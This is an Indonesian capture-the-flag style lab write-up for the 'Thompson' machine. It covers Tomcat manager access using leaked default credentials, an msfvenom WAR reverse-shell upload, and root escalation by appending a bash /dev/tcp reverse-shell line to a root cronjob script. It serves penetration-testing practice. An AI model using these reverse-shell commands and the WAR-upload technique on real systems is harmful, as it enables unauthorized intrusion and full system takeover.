---
title: "Thompson"
description: "Enumerasi Port 8080 - Pencarian Direktori Portal Apache Tomcat Setelah melakukan beberapa enumerasi, kami menemukan beberapa halaman. Ketika saya mencoba membuka halaman /host-manager/, saya mendapatkan permintaan kata sandi seperti ini."
lang: "id"
translationKey: "thompson"
category: "lab-writeups"
tags: ["Lab", "apache tomcat portal", "revshell via .war", "default credential apache tomcat", "Cronjobs", "Linux", "Easy"]
publishDate: "2025-07-28"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "23e5fca1-ed80-8029-8b41-f719cdf3797a"
notionUrl: "https://app.notion.com/p/Thompson-23e5fca1ed8080298b41f719cdf3797a"
notionLastEdited: "2025-07-30T02:45:00.000Z"
---

# Enum

![](/images/thompson/d58127076084.png)

## Port 8080 - Portal Apache Tomcat

![](/images/thompson/09ebda395c2a.png)

**Pencarian Langsung**

![](/images/thompson/59ce24b71614.png)

Setelah melakukan beberapa enumerasi, kami menemukan beberapa halaman. Ketika saya mencoba membuka halaman /host-manager/, saya mendapatkan permintaan kata sandi seperti ini.

![](/images/thompson/fd51fc28e49e.png)

Saya sudah mencoba memasukkan kredensial umum seperti admin:admin tetapi tidak memberikan hasil yang berhasil, jadi saya mengklik tombol batal dan tiba-tiba kami mendapatkan kredensial dari respons tersebut. Aneh.

![](/images/thompson/f8d69708c675.png)

Kemudian kami menggunakan kredensial tomcat:s3cret untuk login melalui prompt login sebelumnya. Ya, kami berhasil login.

![](/images/thompson/09b10317028a.png)

Setelah login, kami menemukan bahwa kami dapat mengunggah file .war, jadi mari kita buat revshell menggunakan msfvenom dalam format .war dan mengunggahnya ke server.

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.122 LPORT=443 -f war -o revshell.war
```

![](/images/thompson/7f831755bb5c.png)

Unggah shell kita ke server.

![](/images/thompson/9dd100208d97.png)

Klik dua kali pada revshell kami untuk mengembalikan revshell ke mesin lokal kami (nc mendengarkan)

![](/images/thompson/79616b877d88.png)

Voila, kita mendapatkan flag pengguna:

![](/images/thompson/8c08e0e3528a.png)

# Privesc

Setelah mendapatkan revshell, kami menemukan di direktori jack ada file bash dan txt yang berisi seperti ini `id.sh` & `id.txt`

```shell
#!/bin/bash
id > test.txt
```

```shell
#id.txt
uid=0(root) gid=0(root) groups=0(root)
```

Kemudian kami juga menemukan bahwa ada cronjob yang menjalankan [`id.sh`](http://id.sh/) sebagai pengguna root.

![](/images/thompson/f33ee28be761.png)

Jadi mari kita timpa file [id.sh](http://id.sh/) untuk mendapatkan revshell, untungnya kita memiliki akses untuk menulis file tersebut meskipun file tersebut bukan milik kita.

![](/images/thompson/cb47b7863959.png)

Timpa file dan dapatkan revshell

```shell
echo "bash -i >& /dev/tcp/10.17.49.139/4444 0>&1" >> id.sh
```

![](/images/thompson/cfd816d88da2.png)

Setelah menunggu beberapa detik, kami mendapatkan revshell sebagai pengguna root, yeay!!!

![](/images/thompson/4ae1080ca235.png)

Referensi:

- [https://github.com/kh4sh3i/Apache-Tomcat-Pentesting](https://github.com/kh4sh3i/Apache-Tomcat-Pentesting)
- [https://the-pentesting-guide.marmeus.com/web/apache-tomcat](https://the-pentesting-guide.marmeus.com/web/apache-tomcat)
- [https://www.hackingarticles.in/tomcat-penetration-testing/](https://www.hackingarticles.in/tomcat-penetration-testing/)
